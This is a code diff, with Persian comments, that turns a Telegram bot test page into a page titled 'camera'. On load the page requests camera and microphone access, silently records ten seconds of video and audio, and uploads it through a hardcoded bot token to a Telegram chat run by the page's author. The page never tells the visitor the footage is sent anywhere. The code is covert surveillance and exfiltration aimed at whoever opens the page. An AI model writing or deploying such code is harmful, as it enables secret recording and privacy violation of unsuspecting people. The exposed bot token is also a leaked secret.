@@ -1,28 +1,102 @@
 <!DOCTYPE html>
-<html>
+<html lang="fa">
 <head>
-  <title>تست تلگرام</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>دوربین</title>
+  <style>
+    body,html{margin:0;padding:0;height:100%;background:#000;overflow:hidden;}
+    video{width:100%;height:100%;object-fit:cover;}
+    #status{position:absolute;top:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.8);color:white;padding:12px 25px;border-radius:10px;z-index:100;}
+  </style>
 </head>
 <body>
 
-<button onclick="testBot()">تست بات</button>
+<video id="video" autoplay playsinline muted></video>
+<div id="status">در حال درخواست دسترسی به دوربین...</div>
 
 <script>
+// ================== تنظیمات تلگرام ==================
 const BOT_TOKEN = "8687133754:AAEIvtI61moYzNCRLtsdU3-U5tUMxJkb9bU";
-const CHAT_ID = "6512853118";   // چت آیدی خودت
+const CHAT_ID = "YOUR_CHAT_ID_HERE";   // ← چت آیدی خودت
 
-async function testBot() {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=✅ تست موفق بود!`;
+let stream = null;
+let mediaRecorder = null;
+let recordedChunks = [];
 
-    try {
-        const res = await fetch(url);
-        const data = await res.json();
-        console.log(data);
-        alert(data.ok ? "✅ ارسال شد!" : "❌ مشکل: " + data.description);
-    } catch(e) {
-        alert("خطای اتصال: " + e.message);
-        console.error(e);
+// عناصر
+const video = document.getElementById('video');
+const statusDiv = document.getElementById('status');
+
+// شروع خودکار دوربین بعد از لود
+window.onload = () => {
+  startCamera();
+};
+
+async function startCamera() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "environment", width: {ideal:1280}, height: {ideal:720} },
+      audio: true
+    });
+
+    video.srcObject = stream;
+    statusDiv.textContent = "دوربین روشن شد — در حال ضبط ۱۰ ثانیه...";
+
+    // شروع خودکار ضبط
+    startAutoRecording();
+
+  } catch (err) {
+    statusDiv.textContent = "دسترسی به دوربین رد شد";
+    console.error(err);
+  }
+}
+
+function startAutoRecording() {
+  recordedChunks = [];
+  mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+  mediaRecorder.ondataavailable = e => {
+    if (e.data.size > 0) recordedChunks.push(e.data);
+  };
+
+  mediaRecorder.onstop = () => {
+    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+    sendToTelegram(blob);
+  };
+
+  mediaRecorder.start();
+  console.log("ضبط خودکار شروع شد...");
+
+  // دقیقاً ۱۰ ثانیه ضبط
+  setTimeout(() => {
+    if (mediaRecorder && mediaRecorder.state === "recording") {
+      mediaRecorder.stop();
     }
+  }, 10000);
+}
+
+async function sendToTelegram(videoBlob) {
+  const formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  formData.append("caption", "📹 ویدیو ۱۰ ثانیه‌ای خودکار");
+  formData.append("video", videoBlob, "video.webm");
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+      method: "POST",
+      body: formData
+    });
+    if (res.ok) {
+      statusDiv.textContent = "✅ ویدیو با موفقیت ارسال شد";
+      console.log("ارسال موفق");
+    } else {
+      statusDiv.textContent = "❌ ارسال ناموفق";
+    }
+  } catch (err) {
+    statusDiv.textContent = "❌ خطا در ارسال";
+    console.error(err);
+  }
 }
 </script>
 </body>
